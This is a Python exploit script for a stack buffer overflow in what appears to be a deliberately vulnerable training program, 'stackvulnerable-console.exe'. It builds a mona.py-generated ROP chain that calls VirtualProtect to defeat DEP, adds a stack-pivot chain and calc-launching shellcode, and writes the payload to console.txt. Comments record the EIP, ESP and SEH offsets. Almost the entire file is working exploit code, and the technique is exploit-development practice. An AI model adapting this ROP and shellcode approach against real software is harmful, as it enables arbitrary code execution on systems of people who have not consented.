import struct

outputfile = "console.txt"
badchars = "\x00\x09\x0a\x0b\x0c\x0d\x1a\x1b\x20\x28"

def stack_rop_chain():
	# this rop chain is used to jump back to beginning of the payload
	rop_gadgets = [	        
        # Jump back replacement with a ROP chain
        0x7dde87ea,  # POP ECX # RETN    ** [kernel32.dll] **   |   {PAGE_EXECUTE_READ}
		0xfffffbe8,  # 0018FF24 (ESP) + fffffbe8 = 0018FB0C (410 to Payload)
        0x7df3f8c3,  # ADD ESP,ECX # POP EBP # RETN 0x04    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    # !mona rop -cpb "\x00\x09\x0a\x0b\x0c\x0d\x1a\x1b\x20\x28" -m ntdll.dll,kernel32.dll,stackvulnerable-console.exe
    rop_gadgets = [
        # Register setup for VirtualProtect() :
        # --------------------------------------------
        # EAX = NOP (0x90909090)
        # ECX = lpOldProtect (ptr to W address)
        # EDX = NewProtect (0x40)
        # EBX = dwSize
        # ESP = lPAddress (automatic)
        # EBP = ReturnTo (ptr to jmp esp)
        # ESI = ptr to VirtualProtect()
        # EDI = ROP NOP (RETN)

        #######################
        # Padding remnant for the stack pivoting adjustment
        0x41414141,  # Padding for EBP

        #[---INFO:gadgets_to_set_esi:---] Not required as ESI changes below
        # 0x7DD743CE,  # ptr to kernel32.VirtualProtect // Manual fix
        # 0x7dea27ec,  # MOV EAX,DWORD PTR DS:[EAX] # RETN 0x04 [ntdll.dll] ** ASLR 
        # 0x7dd7071c,  # XCHG EAX,ESI # RETN [kernel32.dll] ** ASLR 
        # 0x41414141,  # Filler (RETN offset compensation)

        #[---INFO:gadgets_to_set_ebx and esi---] // Manual Fix
        # 0x00000000,  # [-] Unable to find gadget to put 00000201 into ebx
        0x7ddff385,  # POP EAX # RETN [kernel32.dll] ** ASLR 
        0x41414141,  # Filler (compensate)
        0xfffffbdb,  # Value to negate, will become 0x00000425 
        0x7de0bc6f,  # NEG EAX # POP EBP # RETN 0x04    ** [kernel32.dll] **   |   {PAGE_EXECUTE_READ}
        0x41414141,  # Filler (compensate)
        0x7de9f9db,  # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 0x10    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}       
        0x48414141,  # Filler (compensate)
        0x43414141,  # Filler (compensate)
        0x7de9f9db,  # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 0x10    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}       
        0x44414141,  # Filler (compensate)
        0x47414141,  # Filler (compensate)
        0x45414141,  # Filler (compensate)
        0x46414141,  # Filler (compensate)
        # This goes to ESI
        0x7DD743CE,  # ptr to kernel32.VirtualProtect

        #[---INFO:gadgets_to_set_edx:---]
        0x7ddff385,  # POP EAX # RETN [kernel32.dll] ** ASLR 
        0x41414141,  # Filler (compensate)
        0x42414141,  # Filler (compensate)
        0x43414141,  # Filler (compensate)
        0x44414141,  # Filler (compensate)
        0xffffffdf,  # put delta into eax (-> put 0x00000040 into edx)
        0x7df36814,  # ADD EAX,61 # POP EBP # RETN 0x04 [ntdll.dll] ** ASLR 
        0x45414141,  # Filler (compensate)
        0x7decf1c0,  # XCHG EAX,EDX # RETN [ntdll.dll] ** ASLR 
        0x46414141,  # Filler (RETN offset compensation)

        #[---INFO:gadgets_to_set_ecx:---]
        0x7df46e64,  # POP ECX # RETN [ntdll.dll] ** ASLR 
        0x7df71fa5,  # &Writable location [ntdll.dll] ** ASLR

        #[---INFO:gadgets_to_set_edi:---]
        0x7deebd04,  # POP EDI # RETN [ntdll.dll] ** ASLR 
        0x7df32522,  # RETN (ROP NOP) [ntdll.dll] ** ASLR

        #[---INFO:gadgets_to_set_ebp:---]
        0x7df447c2,  # POP EBP # RETN [ntdll.dll] ** ASLR 
        0x7dd9493f,  # & push esp # ret  [kernel32.dll] ** ASLR

        #[---INFO:gadgets_to_set_eax:---]
        0x7de11556,  # POP EAX # RETN [kernel32.dll] ** ASLR 
        0x90909090,  # nop

        #[---INFO:pushad:---]
        #0x7de2b284,  # PUSHAD # RETN 0x0C [kernel32.dll] ** ASLR 
        0x7dd7d615,  # PUSHAD # ADD AL,0 # RETN    ** [kernel32.dll] **   |   {PAGE_EXECUTE_READ}
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

# Shellcode 32-bit Run Calc
buf = "\x90" * 8
buf += b"\xdb\xd4\xbe\x5e\x2d\x0e\x1f\xd9\x74\x24\xf4\x5f\x2b"
buf += b"\xc9\xb1\x30\x31\x77\x18\x03\x77\x18\x83\xc7\x5a\xcf"
buf += b"\xfb\xe3\x8a\x8d\x04\x1c\x4a\xf2\x8d\xf9\x7b\x32\xe9"
buf += b"\x8a\x2b\x82\x79\xde\xc7\x69\x2f\xcb\x5c\x1f\xf8\xfc"
buf += b"\xd5\xaa\xde\x33\xe6\x87\x23\x55\x64\xda\x77\xb5\x55"
buf += b"\x15\x8a\xb4\x92\x48\x67\xe4\x4b\x06\xda\x19\xf8\x52"
buf += b"\xe7\x92\xb2\x73\x6f\x46\x02\x75\x5e\xd9\x19\x2c\x40"
buf += b"\xdb\xce\x44\xc9\xc3\x13\x60\x83\x78\xe7\x1e\x12\xa9"
buf += b"\x36\xde\xb9\x94\xf7\x2d\xc3\xd1\x3f\xce\xb6\x2b\x3c"
buf += b"\x73\xc1\xef\x3f\xaf\x44\xf4\xe7\x24\xfe\xd0\x16\xe8"
buf += b"\x99\x93\x14\x45\xed\xfc\x38\x58\x22\x77\x44\xd1\xc5"
buf += b"\x58\xcd\xa1\xe1\x7c\x96\x72\x8b\x25\x72\xd4\xb4\x36"
buf += b"\xdd\x89\x10\x3c\xf3\xde\x28\x1f\x99\x21\xbe\x25\xef"
buf += b"\x22\xc0\x25\x5f\x4b\xf1\xae\x30\x0c\x0e\x65\x75\xe2"
buf += b"\x44\x24\xdf\x6b\x01\xbc\x62\xf6\xb2\x6a\xa0\x0f\x31"
buf += b"\x9f\x58\xf4\x29\xea\x5d\xb0\xed\x06\x2f\xa9\x9b\x28"
buf += b"\x9c\xca\x89\x4a\x43\x59\x51\x8d"

# ROP chain to change the permissions to RWX (0x40) using VirtualProtect
ropchain = create_rop_chain()

# To be replaced with the payload
# 1032 - length of the payload
padding = ropchain + buf + "\xcc"*(1032-len(buf)-len(ropchain))

# After using !mona pc 1500 and !mona findmsp
# Padding info in register and SEH alignment are below
# EIP contains normal pattern : 0x69423569 (offset 1036)
# ESP (0x0018ff1c) points at offset 1040 in normal pattern (length 210)
# EBP contains normal pattern : 0x42346942 (offset 1032)
# SEH record (nseh field) at 0x0018ffc4 overwritten with normal pattern : 0x336f4232 (offset 1208)

# Break point at 0x004012AF for debugging the bug
# POP EBP
# RET
ebp = "BBBB"

# Stack pivoting ROP chain replaces all EIP, ESP and rest
# It starts execution with EIP controlled and jump back
# to the ROP chain used to set permissions to RWX 
# using VirtualProtect, then execute the shellcode
stackropchain = stack_rop_chain()

buffer = padding + ebp + stackropchain

print("[+] Creating %s" % outputfile)
f = open(outputfile,'wb')
print("[+] Writing %d bytes to file" % len(buffer))
f.write(buffer)
print("[+] Done")
f.close()